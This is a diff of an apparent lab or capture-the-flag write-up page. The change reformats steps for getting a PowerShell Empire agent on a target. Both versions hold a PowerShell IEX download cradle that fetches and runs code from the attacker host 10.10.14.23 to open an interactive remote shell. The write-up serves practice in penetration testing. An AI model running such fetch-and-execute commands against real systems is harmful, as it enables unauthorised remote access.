@@ -52,13 +52,12 @@
 					Which will essentially let us run any powershell we want on the machine. This sounded like the perfect opportunity to brush up <br/>
 					on our Powershell Empire skills. Our execution flow is going to look something like this - <br/> <br/>
 					
-					With empire we will generate a launcher.bat file, and start up a listener. We will then serve our launcher.bat file with a simple python webserver <br/> <br/>
+					                  1 - In empire we generate a powershell launcher, and start up a listener. <br/> <br/>
+					                  2 - Drop the launcher into a launcher.bat file <br/> <br/>
+					                  3 - Start up a python webserver to serve the launcher.bat file <br/> <br/>
+					                  4 - Run the github exploit with <b> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/nc.exe')" </b> <br/> <br/> <br/>
 					
-					We then run the github exploit with the following powershell - <br/> <br/>
-					
-					<b> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/nc.exe')" </b> <br/> <br/>
-					
-					Which in theory should pull our launcher.bat file, make the connection to our empire agent, which feeds it the rest of a fully interactive shell. <br/>
+					This should pull our launcher.bat file, make the connection to our empire agent, which feeds it the rest of a fully interactive shell. <br/>
 					We should end up with a fully interactive empire agent if all goes right.
 			
 			</p>
